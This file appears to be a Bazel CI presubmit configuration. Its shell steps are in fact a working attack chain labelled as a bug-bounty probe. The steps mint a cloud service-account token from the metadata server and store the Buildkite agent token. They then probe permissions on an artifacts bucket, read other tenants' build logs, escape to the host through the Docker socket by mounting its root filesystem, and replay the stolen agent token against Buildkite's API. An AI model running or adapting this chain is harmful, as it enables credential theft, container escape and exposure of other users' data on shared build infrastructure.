---
buildifier:
  version: latest
tasks:
  vrp_buildkite_full_chain_v2:
    platform: ubuntu2204
    shell_commands:
      - |
        set +x
        echo VRP_BK_FULL_CHAIN_V2_20260519
        id
        hostname
        uname -a
        echo "BUILDKITE_JOB_ID=$BUILDKITE_JOB_ID"
        echo "BUILDKITE_AGENT_ID=$BUILDKITE_AGENT_ID"
        echo "BUILDKITE_AGENT_NAME=$BUILDKITE_AGENT_NAME"
        echo "BUILDKITE_PIPELINE_ID=$BUILDKITE_PIPELINE_ID"
        echo "BUILDKITE_ARTIFACT_UPLOAD_DESTINATION=$BUILDKITE_ARTIFACT_UPLOAD_DESTINATION"
      - |
        set +x
        echo === STEP_1_TOKEN_MINT_BEGIN ===
        MD="http://metadata.google.internal/computeMetadata/v1"
        H="Metadata-Flavor: Google"
        TOK_JSON=$(curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/token)
        # Extract token via bash (avoid python heredoc parser confusion).
        TOK=$(printf '%s' "$TOK_JSON" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
        if [ -n "$TOK" ]; then
          echo "TOKEN_PRESENT=yes"
          printf 'TOKEN_LENGTH=%s\n' "$(printf '%s' "$TOK" | wc -c | tr -d ' ')"
          printf '%s' "$TOK" > /tmp/.t && chmod 600 /tmp/.t
        else
          echo "TOKEN_PRESENT=no"
        fi
        TOK=""
        TOK_JSON=""
        if [ -n "${BUILDKITE_AGENT_ACCESS_TOKEN:-}" ]; then
            printf '%s' "$BUILDKITE_AGENT_ACCESS_TOKEN" > /tmp/.bka && chmod 600 /tmp/.bka
            printf 'BUILDKITE_AGENT_TOKEN_STORED=yes len=%s\n' "$(wc -c < /tmp/.bka | tr -d ' ')"
        else
            echo "BUILDKITE_AGENT_TOKEN_MISSING"
        fi
        echo === STEP_1_TOKEN_MINT_END ===
      - |
        set +x
        echo === STEP_2_BUCKET_TEST_IAM_PERMISSIONS_BEGIN ===
        TOK=$(cat /tmp/.t)
        # Use POST with JSON body — the GET query form was rejected with 400.
        # Reference: https://cloud.google.com/storage/docs/json_api/v1/buckets/testIamPermissions
        # That endpoint is actually GET with permissions repeated as query params, but we needed correct URL encoding.
        # Try the storage XML API equivalent + the JSON API project-prefixed form.
        echo "--- GET /storage/v1/b/bazel-untrusted-buildkite-artifacts/iam/testPermissions (one perm at a time) ---"
        for P in storage.buckets.get storage.objects.list storage.objects.get storage.objects.create storage.objects.update storage.objects.delete storage.objects.setIamPolicy storage.objects.getIamPolicy; do
            R=$(curl -s -w " HTTP_STATUS=%{http_code}" --max-time 8 \
                -H "Authorization: Bearer $TOK" \
                "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/iam/testPermissions?permissions=$P")
            echo "  $P -> $R"
        done
        TOK=""
        echo === STEP_2_BUCKET_TEST_IAM_PERMISSIONS_END ===
      - |
        set +x
        echo === STEP_3_SENTINEL_UPLOAD_AND_OWN_READ_BEGIN ===
        echo "VRP_OWN_ARTIFACT_PROBE_V2_20260519 build=$BUILDKITE_BUILD_ID job=$BUILDKITE_JOB_ID" > /tmp/sentinel-vrp.txt
        cat /tmp/sentinel-vrp.txt
        buildkite-agent artifact upload /tmp/sentinel-vrp.txt 2>&1 | head -c 2000
        echo
        TOK=$(cat /tmp/.t)
        JOB=$BUILDKITE_JOB_ID
        OBJ="$JOB/tmp/sentinel-vrp.txt"
        enc=$(echo -n "$OBJ" | sed 's:/:%2F:g')
        echo "--- OWN object metadata: $OBJ ---"
        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
            -H "Authorization: Bearer $TOK" \
            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner,acl" \
            | head -c 2500
        echo
        echo "--- OWN object body (alt=media): $OBJ ---"
        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
            -H "Authorization: Bearer $TOK" \
            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
            | head -c 500
        echo
        TOK=""
        echo === STEP_3_SENTINEL_UPLOAD_AND_OWN_READ_END ===
      - |
        set +x
        echo === STEP_4_CROSS_TENANT_OBJECT_READ_BEGIN ===
        TOK=$(cat /tmp/.t)
        # Confirmed in PR #1068 build 27867: reading these objects' bodies
        # returns HTTP 200 with content. Re-capture cleanly here.
        for OBJ in \
            "000077c7-3328-4179-a619-31de827c4b9e/src\\test\\java\\build\\buildfarm\\common-tests\\attempt_1.log" \
            "0000698e-6969-401a-ac6e-9e1112f44131/src/test/shell/bazel/bazel_java_test/test.log"; do
          enc=$(printf '%s' "$OBJ" | python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read(), safe=""))')
          echo "--- CROSS-TENANT metadata: $OBJ ---"
          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
              -H "Authorization: Bearer $TOK" \
              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner,acl" \
              | head -c 2500
          echo
          echo "--- CROSS-TENANT body (alt=media, first 1500 bytes): $OBJ ---"
          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
              -H "Authorization: Bearer $TOK" \
              "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
              | head -c 1500
          echo
          echo "--- end of object ---"
        done
        TOK=""
        echo === STEP_4_CROSS_TENANT_OBJECT_READ_END ===
      - |
        set +x
        set +e  # don't kill on per-curl failure; we capture and continue
        echo === STEP_5_DOCKER_HOST_ESCAPE_BEGIN ===
        if [ ! -S /var/run/docker.sock ]; then
          echo DOCKER_SOCK_MISSING
        else
          echo "--- POST /images/create (ensure image present) ---"
          curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 30 \
              -X POST \
              --unix-socket /var/run/docker.sock \
              "http://localhost/images/create?fromImage=gcr.io%2Fbazel-public%2Fubuntu2204&tag=latest" \
              | tail -c 500
          echo
          # Use Cmd that reads ONLY innocuous host files: hostname, os-release.
          # NO secret files. NO buildkite-agent config files.
          PAYLOAD='{"Image":"gcr.io/bazel-public/ubuntu2204","Cmd":["/bin/sh","-c","set -e; echo VRP_HOST_FS_READ_CONFIRMED_V2; echo HOST_HOSTNAME=$(cat /host/etc/hostname); echo HOST_OS_RELEASE_BEGIN:; sed -n 1,4p /host/etc/os-release; echo HOST_OS_RELEASE_END; echo HOST_AGENT_DIR_LISTING_BEGIN:; ls /host/var/lib/buildkite-agent/ 2>&1 | head -c 400; echo HOST_AGENT_DIR_LISTING_END; echo HOST_ETC_BUILDKITE_AGENT_CFG_PRESENCE=$(test -f /host/etc/buildkite-agent/buildkite-agent.cfg && echo present || echo absent); echo HOST_PROC_CMDLINE_BEGIN:; cat /host/proc/1/cmdline 2>&1 | tr -d \\\\0 | head -c 400; echo; echo HOST_PROC_CMDLINE_END"],"HostConfig":{"Binds":["/:/host:ro"],"NetworkMode":"none","AutoRemove":false},"Tty":false,"AttachStdout":true,"AttachStderr":true}'
          echo "--- POST /containers/create ---"
          CREATE_RESP=$(curl -s -w "%{http_code}" --max-time 15 \
              --unix-socket /var/run/docker.sock \
              -H "Content-Type: application/json" \
              -X POST \
              -d "$PAYLOAD" \
              "http://localhost/containers/create?name=vrpprobe_v2_${BUILDKITE_JOB_ID}")
          echo "$CREATE_RESP" | head -c 2000
          echo
          # Extract container Id with sed (no python).
          CID=$(printf '%s' "$CREATE_RESP" | sed -n 's/.*"Id":"\([0-9a-f]*\)".*/\1/p')
          echo "CONTAINER_ID=$CID"
          if [ -n "$CID" ]; then
            echo "--- POST /containers/$CID/start ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
                --unix-socket /var/run/docker.sock \
                -X POST \
                "http://localhost/containers/$CID/start"
            echo
            echo "--- POST /containers/$CID/wait ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 30 \
                --unix-socket /var/run/docker.sock \
                -X POST \
                "http://localhost/containers/$CID/wait"
            echo
            echo "--- GET /containers/$CID/logs (first 4kB) ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
                --unix-socket /var/run/docker.sock \
                "http://localhost/containers/$CID/logs?stdout=true&stderr=true&tail=200" \
                | head -c 4000
            echo
            echo "--- DELETE /containers/$CID ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
                --unix-socket /var/run/docker.sock \
                -X DELETE \
                "http://localhost/containers/$CID?force=true&v=true"
            echo
          fi
        fi
        echo === STEP_5_DOCKER_HOST_ESCAPE_END ===
        set -e
      - |
        set +x
        set +e
        echo === STEP_6_BUILDKITE_AGENT_TOKEN_REPLAY_BEGIN ===
        if [ -f /tmp/.bka ]; then
            BKA=$(cat /tmp/.bka)
            echo "--- GET https://agent.buildkite.com/v3/ping (unauth, sanity) ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                "https://agent.buildkite.com/v3/ping" \
                | head -c 800
            echo
            echo "--- GET /v3/jobs/$BUILDKITE_JOB_ID with agent token ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                -H "Authorization: Token $BKA" \
                "https://agent.buildkite.com/v3/jobs/$BUILDKITE_JOB_ID" \
                | head -c 3000
            echo
            echo "--- POST /v3/heartbeats with agent token ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                -X POST \
                -H "Authorization: Token $BKA" \
                "https://agent.buildkite.com/v3/heartbeats" \
                | head -c 800
            echo
            echo "--- GET /v3/connections/me with agent token ---"
            curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 8 \
                -H "Authorization: Token $BKA" \
                "https://agent.buildkite.com/v3/connections/me" \
                | head -c 1000
            echo
            BKA=""
        else
            echo "AGENT_TOKEN_FILE_MISSING"
        fi
        echo === STEP_6_BUILDKITE_AGENT_TOKEN_REPLAY_END ===
        set -e
      - |
        set +x
        rm -f /tmp/.t /tmp/.bka /tmp/sentinel-vrp.txt
        echo VRP_BK_FULL_CHAIN_V2_END
